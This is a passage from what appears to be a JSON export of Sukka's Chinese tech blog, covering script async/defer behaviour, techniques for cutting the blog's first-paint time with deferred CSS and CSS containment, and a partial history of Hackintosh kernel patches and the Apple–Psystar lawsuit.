发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\"> <div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-13</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\"> <div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-03</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 